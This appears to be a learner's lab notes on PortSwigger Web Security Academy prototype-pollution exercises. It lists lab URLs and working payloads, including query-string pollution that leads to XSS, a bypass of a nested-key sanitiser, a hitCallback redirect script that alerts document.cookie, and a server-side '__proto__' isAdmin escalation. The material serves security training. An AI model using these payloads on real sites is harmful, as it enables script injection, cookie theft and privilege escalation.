Client side

Lab 1

view-source:https://0a0d0019048a47d3802ed00900d20097.web-security-academy.net/resources/js/deparam.js

view-source:https://0aba007904a9a65f82091ff4000a007d.web-security-academy.net/resources/js/searchLogger.js

https://0a0d0019048a47d3802ed00900d20097.web-security-academy.net/?search=asdasdasd&__proto__[transport_url]=BURP

https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance

https://portswigger.net/web-security/prototype-pollution

deparam will cause the prototype pollution

xss is found in the searchlogger

Lab 2

https://0a38000004f03c7580ae80ae0095000a.web-security-academy.net/?search=test&__proto__.sequence=123 (pollution)

https://0a38000004f03c7580ae80ae0095000a.web-security-academy.net/?search=test&__proto__.sequence=)};alert();// 

view-source:https://0a38000004f03c7580ae80ae0095000a.web-security-academy.net/resources/js/searchLoggerAlternative.js

view-source:https://0a38000004f03c7580ae80ae0095000a.web-security-academy.net/?search=test

deparam will cause the prototype pollution

xss is found in the searchlogger

Lab 3

view-source:https://0ae0001e048863d8804e8ade005f0070.web-security-academy.net/resources/js/deparamSanitised.js

view-source:https://0ae0001e048863d8804e8ade005f0070.web-security-academy.net/resources/js/searchLoggerFiltered.js

https://0ae0001e048863d8804e8ade005f0070.web-security-academy.net/?search=asdasdasd&__pro__proto__to__[transport_url]=asd

Lab 4 

https://portswigger.net/research/widespread-prototype-pollution-gadgets

https://0a2600e8045ba6d0825456d000010074.web-security-academy.net/#__proto__[hitCallback]=alert%281%29

use dom xss invader

only way... cant really find the function

<script>
window.location = "https://0a2600e8045ba6d0825456d000010074.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>

Lab 5

https://0a1e00b3049cea5683c4f0b600120060.web-security-academy.net/?search=asdasd&__proto__[value]=asdasdasdasd

basically what happens is that you can add Object.prototype.value

so when we defineproperty without setting the value parameter, it overrides the value parameter

https://0a1e00b3049cea5683c4f0b600120060.web-security-academy.net/?search=asdasd&__proto__[value]=data:,alert(1);

Server Side 

Lab 1

"__proto__": {
    "isAdmin":true
}

update address

p straight forward








